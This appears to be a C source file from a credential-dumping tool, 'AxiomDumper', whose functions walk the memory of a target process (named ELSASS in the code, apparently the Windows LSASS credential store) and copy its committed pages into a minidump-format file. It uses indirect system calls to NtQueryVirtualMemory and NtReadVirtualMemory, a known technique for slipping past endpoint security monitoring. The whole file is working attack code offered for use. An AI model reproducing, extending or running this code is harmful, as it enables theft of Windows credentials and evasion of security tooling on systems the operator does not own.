#include <stdio.h>

#include "AxiomDumper.h"
#include "SSN.h"
#include "SSN_Hashes.h"

BOOL is_important_module(PVOID address, PMODULEINFO module_list)
{
    PMODULEINFO curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < RVA(ULONG_PTR, curr_module->dll_base, curr_module->size_of_image))
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

PDumpMemoryDescriptor64 get_memory_ranges(PDUMPCONTEXT dc, IN PMODULEINFO module_list)
{
    PDumpMemoryDescriptor64 ranges_list = NULL;
    PVOID base_address, current_address;
    PDumpMemoryDescriptor64 new_range;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = MemoryBasicInformation;
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    DWORD number_of_ranges = 0;
    NTSTATUS status;

    //printf("[DEBUG] Getting memory ranges to dump\n");

    while (TRUE)
    {
        IndirectSyscall(
            status,
            AXIOM_SSN_NtQueryVirtualMemory,
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL
        );
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;

        if (((ULONG_PTR)base_address + region_size) < (ULONG_PTR)base_address)
            break;

        // next memory range
        current_address = RVA(PVOID, base_address, region_size);

        if (mbi.State != MEM_COMMIT
            || mbi.Type == MEM_MAPPED
            || (mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS
            || (mbi.Protect & PAGE_GUARD) == PAGE_GUARD
            || (mbi.Protect & PAGE_EXECUTE) == PAGE_EXECUTE)
            continue;

        if (mbi.Type == MEM_IMAGE && !is_important_module(base_address, module_list))
            continue;

        new_range = (PDumpMemoryDescriptor64)HeapAlloc(GetProcessHeap(), 0x00000008, sizeof(DumpMemoryDescriptor64));
        if (!new_range)
        {
            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;
        new_range->State = mbi.State;
        new_range->Protect = mbi.Protect;
        new_range->Type = mbi.Type;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            PDumpMemoryDescriptor64 last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
        number_of_ranges++;
    }
    if (!ranges_list)
        return (NULL);

    //printf("[DEBUG] Enumerated %ld ranges of memory\n", number_of_ranges);
    return ranges_list;
}

PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO module_list)
{
    PDumpMemoryDescriptor64 memory_ranges;
    ULONG32 stream_rva = dc->rva;
    NTSTATUS status;
    int i;

    //printf("[DEBUG] Extracting memory pages\n");

    memory_ranges = get_memory_ranges(dc, module_list);
    if (!memory_ranges)
        return (NULL);

    PDumpMemoryDescriptor64 curr_range = memory_ranges;
    ULONG64 number_of_ranges = 0;
    while (curr_range)
    {
        number_of_ranges++;
        curr_range = curr_range->next;
    }
    number_of_ranges -= 0;
    ELSASS_Append(dc, &number_of_ranges, 8, 0x00);

    if (16 + 16 * number_of_ranges > 0xffffffff)
    {
        printf("[FAILURE] Too many memory ranges\n");
        return (NULL);
    }

    // write the rva of the actual memory content
    ULONG32 stream_size = (ULONG32)(16 + 16 * number_of_ranges);
    ULONG64 base_rva = (ULONG64)stream_rva + stream_size;
    ELSASS_Append(dc, &base_rva, 8, 0x00);

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        ELSASS_Append(dc, &curr_range->StartOfMemoryRange, 8, 0x00);
        ELSASS_Append(dc, &curr_range->DataSize, 8, 0x00);
        curr_range = curr_range->next;
    }

    ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4, &stream_size, 4, 0x00);
    ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4 + 4, &stream_rva, 4, 0x00);

    // dump all the selected memory ranges
    i = 0;
    char tosend[1024];
    curr_range = memory_ranges;

    DEBUG_LOG("[*] There is %llu memory ranges\n", number_of_ranges);
    while (curr_range && i <= number_of_ranges)
    {
        int rounds = 1;
        DEBUG_LOG("page size: %llu\n", curr_range->DataSize);
        for (int rep = 0; rep < rounds; rep++)
        {
            ULONG64 offset = 0;
            ULONG64 readSize = curr_range->DataSize;
            PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0x00000008, readSize - 2048);
            PBYTE spliter = (PBYTE)HeapAlloc(GetProcessHeap(), 0x00000008, 4096);
            PBYTE buffer2 = (PBYTE)HeapAlloc(GetProcessHeap(), 0x00000008, 2048);

            IndirectSyscall(
                status,
                AXIOM_SSN_NtReadVirtualMemory,
                dc->hProcess,
                (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
                buffer,
                curr_range->DataSize - 2048,
                NULL
            );
            IndirectSyscall(
                status,
                AXIOM_SSN_NtReadVirtualMemory,
                dc->hProcess,
                (PVOID)(ULONG_PTR)(curr_range->StartOfMemoryRange + curr_range->DataSize - 2048),
                buffer2,
                2048,
                NULL
            );

            if (i == 0)
            {
                i = dc->rva;
                DEBUG_LOG("Writing to %d offset\n", i);
                i = 0;
            }

            ELSASS_Append(dc, buffer, (ULONG32)(curr_range->DataSize - 2048), 0x00);
            ELSASS_Append(dc, buffer2, (ULONG32)(2048), 0x00);
            memset(buffer, 0, curr_range->DataSize - 2048);
            memset(buffer2, 0, 2048);
            HeapFree(GetProcessHeap(), NULL, buffer);
            HeapFree(GetProcessHeap(), NULL, spliter);
            HeapFree(GetProcessHeap(), NULL, buffer2);
        }

        if (i % 10 == 0)
        {
            DEBUG_LOG("[*] Pass: %d\n", i);
        }

        curr_range = curr_range->next;
        i++;
    }

    return (memory_ranges);
}
